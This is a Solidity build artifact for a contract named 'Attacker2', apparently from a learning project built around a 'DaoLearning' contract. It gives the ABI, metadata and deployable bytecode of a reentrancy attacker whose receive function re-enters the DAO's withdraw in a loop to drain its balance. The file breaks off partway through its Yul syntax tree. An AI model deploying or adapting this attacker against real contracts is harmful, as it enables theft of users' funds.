{
  "contractName": "Attacker2",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "addr",
          "type": "address"
        }
      ],
      "name": "initializeDao",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "depositToDao",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "myDaoBalance",
      "outputs": [
        {
          "internalType": "uint64",
          "name": "",
          "type": "uint64"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "withdrawFromDao",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.8.14+commit.80d49f37\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"depositToDao\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"initializeDao\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"myDaoBalance\",\"outputs\":[{\"internalType\":\"uint64\",\"name\":\"\",\"type\":\"uint64\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawFromDao\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"project:/contracts/Attacker2.sol\":\"Attacker2\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"project:/contracts/Attacker2.sol\":{\"keccak256\":\"0x9287035d8675d6a2bed1410c6d95dcc117c8f049724c3db0fea648a26cf5f70e\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://02d45eb5bca6c4fa23337ed49cf915f2cb73d1b6d084c126ade8b7d74283e00f\",\"dweb:/ipfs/QmaTsFxQhv5BjLmEuHhCAi9w7y2Ci6sXs6DCnGrm24kURC\"]},\"project:/contracts/DaoLearning.sol\":{\"keccak256\":\"0x642366f37ef6a050d5ec701546dec53e5102af5daab55da2a1b43df79cac35cd\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://c029cb2569114228980ad5428c6d0b62b7dbf904c600a485e2a9f889dcc83c7c\",\"dweb:/ipfs/QmasgqB9yytaVsRyc9eWKdYSjKWwpeYaWCgHJaxXTV4Hrn\"]}},\"version\":1}",
  "bytecode": "0x608060405260008060006101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055506000600160146101000a81548160ff02191690831515021790555034801561005457600080fd5b5033600060086101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610630806100a56000396000f3fe60806040526004361061004e5760003560e01c80632f7b73de1461015a57806331c3831014610183578063341b44e1146101ae5780635e286c7b146101b85780639e5faafc146101cf57610155565b3661015557600160149054906101000a900460ff16801561009857506103fc67ffffffffffffffff1660008054906101000a900467ffffffffffffffff1667ffffffffffffffff16105b156101535760008081819054906101000a900467ffffffffffffffff16809291906100c290610479565b91906101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055505034600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110610136576101316101e6565b610152565b6000600160146101000a81548160ff0219169083151502179055505b5b005b600080fd5b34801561016657600080fd5b50610181600480360381019061017c919061050c565b61027c565b005b34801561018f57600080fd5b506101986102c0565b6040516101a59190610548565b60405180910390f35b6101b6610358565b005b3480156101c457600080fd5b506101cd6101e6565b005b3480156101db57600080fd5b506101e46103e9565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663750f0acc61022c6102c0565b6040518263ffffffff1660e01b81526004016102489190610548565b600060405180830381600087803b15801561026257600080fd5b505af1158015610276573d6000803e3d6000fd5b50505050565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c71daccb6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561032f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610353919061058f565b905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663eeb9635c6001346103a391906105c6565b6040518263ffffffff1660e01b81526004016000604051808303818588803b1580156103ce57600080fd5b505af11580156103e2573d6000803e3d6000fd5b5050505050565b60018060146101000a81548160ff02191690831515021790555060016000806101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055506104346101e6565b565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600067ffffffffffffffff82169050919050565b600061048482610465565b915067ffffffffffffffff820361049e5761049d610436565b5b600182019050919050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104d9826104ae565b9050919050565b6104e9816104ce565b81146104f457600080fd5b50565b600081359050610506816104e0565b92915050565b600060208284031215610522576105216104a9565b5b6000610530848285016104f7565b91505092915050565b61054281610465565b82525050565b600060208201905061055d6000830184610539565b92915050565b61056c81610465565b811461057757600080fd5b50565b60008151905061058981610563565b92915050565b6000602082840312156105a5576105a46104a9565b5b60006105b38482850161057a565b91505092915050565b6000819050919050565b60006105d1826105bc565b91506105dc836105bc565b9250828210156105ef576105ee610436565b5b82820390509291505056fea26469706673582212200e73f255900709c80e5374354598c90c427789df6459fc055fa1de5beea68d4564736f6c634300080e0033",
  "deployedBytecode": "0x60806040526004361061004e5760003560e01c80632f7b73de1461015a57806331c3831014610183578063341b44e1146101ae5780635e286c7b146101b85780639e5faafc146101cf57610155565b3661015557600160149054906101000a900460ff16801561009857506103fc67ffffffffffffffff1660008054906101000a900467ffffffffffffffff1667ffffffffffffffff16105b156101535760008081819054906101000a900467ffffffffffffffff16809291906100c290610479565b91906101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055505034600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110610136576101316101e6565b610152565b6000600160146101000a81548160ff0219169083151502179055505b5b005b600080fd5b34801561016657600080fd5b50610181600480360381019061017c919061050c565b61027c565b005b34801561018f57600080fd5b506101986102c0565b6040516101a59190610548565b60405180910390f35b6101b6610358565b005b3480156101c457600080fd5b506101cd6101e6565b005b3480156101db57600080fd5b506101e46103e9565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663750f0acc61022c6102c0565b6040518263ffffffff1660e01b81526004016102489190610548565b600060405180830381600087803b15801561026257600080fd5b505af1158015610276573d6000803e3d6000fd5b50505050565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c71daccb6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561032f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610353919061058f565b905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663eeb9635c6001346103a391906105c6565b6040518263ffffffff1660e01b81526004016000604051808303818588803b1580156103ce57600080fd5b505af11580156103e2573d6000803e3d6000fd5b5050505050565b60018060146101000a81548160ff02191690831515021790555060016000806101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055506104346101e6565b565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600067ffffffffffffffff82169050919050565b600061048482610465565b915067ffffffffffffffff820361049e5761049d610436565b5b600182019050919050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104d9826104ae565b9050919050565b6104e9816104ce565b81146104f457600080fd5b50565b600081359050610506816104e0565b92915050565b600060208284031215610522576105216104a9565b5b6000610530848285016104f7565b91505092915050565b61054281610465565b82525050565b600060208201905061055d6000830184610539565b92915050565b61056c81610465565b811461057757600080fd5b50565b60008151905061058981610563565b92915050565b6000602082840312156105a5576105a46104a9565b5b60006105b38482850161057a565b91505092915050565b6000819050919050565b60006105d1826105bc565b91506105dc836105bc565b9250828210156105ef576105ee610436565b5b82820390509291505056fea26469706673582212200e73f255900709c80e5374354598c90c427789df6459fc055fa1de5beea68d4564736f6c634300080e0033",
  "immutableReferences": {},
  "generatedSources": [],
  "deployedGeneratedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:2908:3",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "35:152:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "52:1:3",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "55:77:3",
                        "type": "",
                        "value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "45:6:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "45:88:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "45:88:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "149:1:3",
                        "type": "",
                        "value": "4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "152:4:3",
                        "type": "",
                        "value": "0x11"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "142:6:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "142:15:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "142:15:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "173:1:3",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "176:4:3",
                        "type": "",
                        "value": "0x24"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "166:6:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "166:15:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "166:15:3"
                }
              ]
            },
            "name": "panic_error_0x11",
            "nodeType": "YulFunctionDefinition",
            "src": "7:180:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "237:57:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "247:41:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "262:5:3"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "269:18:3",
                        "type": "",
                        "value": "0xffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "258:3:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "258:30:3"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "247:7:3"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint64",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "219:5:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "229:7:3",
                "type": ""
              }
            ],
            "src": "193:101:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "342:141:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "352:32:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "378:5:3"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint64",
                      "nodeType": "YulIdentifier",
                      "src": "361:16:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "361:23:3"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "352:5:3"
                    }
                  ]
                },
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "426:22:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "panic_error_0x11",
                            "nodeType": "YulIdentifier",
                            "src": "428:16:3"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "428:18:3"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "428:18:3"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "399:5:3"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "406:18:3",
                        "type": "",
                        "value": "0xffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "eq",
                      "nodeType": "YulIdentifier",
                      "src": "396:2:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "396:29:3"
                  },
                  "nodeType": "YulIf",
                  "src": "393:55:3"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "457:20:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "468:5:3"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "475:1:3",
                        "type": "",
                        "value": "1"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "464:3:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "464:13:3"
                  },
                  "variableNames": [
                    {
                      "name": "ret",
                      "nodeType": "YulIdentifier",
                      "src": "457:3:3"
                    }
                  ]
                }
              ]
            },
            "name": "increment_t_uint64",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "328:5:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "ret",
                "nodeType": "YulTypedName",
                "src": "338:3:3",
                "type": ""
              }
            ],
            "src": "300:183:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "529:35:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "539:19:3",
                  "value": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "555:2:3",
                        "type": "",
                        "value": "64"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "549:5:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "549:9:3"
                  },
                  "variableNames": [
                    {
                      "name": "memPtr",
                      "nodeType": "YulIdentifier",
                      "src": "539:6:3"
                    }
                  ]
                }
              ]
            },
            "name": "allocate_unbounded",
            "nodeType": "YulFunctionDefinition",
            "returnVariables": [
              {
                "name": "memPtr",
                "nodeType": "YulTypedName",
                "src": "522:6:3",
                "type": ""
              }
            ],
            "src": "489:75:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "659:28:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "676:1:3",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "679:1:3",
                        "type": "",
                        "value": "0"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "669:6:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "669:12:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "669:12:3"
                }
              ]
            },
            "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
            "nodeType": "YulFunctionDefinition",
            "src": "570:117:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "782:28:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "799:1:3",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "802:1:3",
                        "type": "",
                        "value": "0"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "792:6:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "792:12:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "792:12:3"
                }
              ]
            },
            "name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
            "nodeType": "YulFunctionDefinition",
            "src": "693:117:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "861:81:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "871:65:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "886:5:3"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "893:42:3",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "882:3:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "882:54:3"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "871:7:3"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "843:5:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "853:7:3",
                "type": ""
              }
            ],
            "src": "816:126:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "993:51:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1003:35:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "1032:5:3"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "1014:17:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1014:24:3"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "1003:7:3"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "975:5:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "985:7:3",
                "type": ""
              }
            ],
            "src": "948:96:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1093:79:3",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "1150:16:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "1159:1:3",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "1162:1:3",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "1152:6:3"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "1152:12:3"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "1152:12:3"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "1116:5:3"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "1141:5:3"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_address",
                              "nodeType": "YulIdentifier",
                              "src": "1123:17:3"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "1123:24:3"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "1113:2:3"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1113:35:3"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "1106:6:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1106:43:3"
                  },
                  "nodeType": "YulIf",
                  "src": "1103:63:3"
                }
              ]
            },
            "name": "validator_revert_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "1086:5:3",
                "type": ""
              }
            ],
            "src": "1050:122:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1230:87:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1240:29:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "1262:6:3"
                      }
                    ],
                    "functionName": {
                      "name": "calldataload",
                      "nodeType": "YulIdentifier",
                      "src": "1249:12:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1249:20:3"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "1240:5:3"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "1305:5:3"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_address",
                      "nodeType": "YulIdentifier",
                      "src": "1278:26:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1278:33:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1278:33:3"
                }
              ]
            },
            "name": "abi_decode_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "1208:6:3",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "1216:3:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "1224:5:3",
                "type": ""
              }
            ],
            "src": "1178:139:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1389:263:3",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "1435:83:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                            "nodeType": "YulIdentifier",
                            "src": "1437:77:3"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "1437:79:3"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "1437:79:3"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "1410:7:3"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "1419:9:3"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "1406:3:3"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1406:23:3"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1431:2:3",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "1402:3:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1402:32:3"
                  },
                  "nodeType": "YulIf",
                  "src": "1399:119:3"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "1528:117:3",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "1543:15:3",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1557:1:3",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "1547:6:3",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "1572:63:3",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "1607:9:3"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "1618:6:3"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "1603:3:3"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "1603:22:3"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "1627:7:3"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_address",
                          "nodeType": "YulIdentifier",
                          "src": "1582:20:3"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1582:53:3"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "1572:6:3"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "1359:9:3",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "1370:7:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "1382:6:3",
                "type": ""
              }
            ],
            "src": "1323:329:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1721:52:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1738:3:3"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "1760:5:3"
                          }
                        ],
                        "functionName": {
                          "name": "cleanup_t_uint64",
                          "nodeType": "YulIdentifier",
                          "src": "1743:16:3"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1743:23:3"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1731:6:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1731:36:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1731:36:3"
                }
              ]
            },
            "name": "abi_encode_t_uint64_to_t_uint64_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "1709:5:3",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1716:3:3",
                "type": ""
              }
            ],
            "src": "1658:115:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1875:122:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1885:26:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "1897:9:3"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1908:2:3",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1893:3:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1893:18:3"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "1885:4:3"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "1963:6:3"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "1976:9:3"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1987:1:3",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1972:3:3"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1972:17:3"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_uint64_to_t_uint64_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "1921:41:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1921:69:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1921:69:3"
                }
              ]
            },
            "name": "abi_encode_tuple_t_uint64__to_t_uint64__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "1847:9:3",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
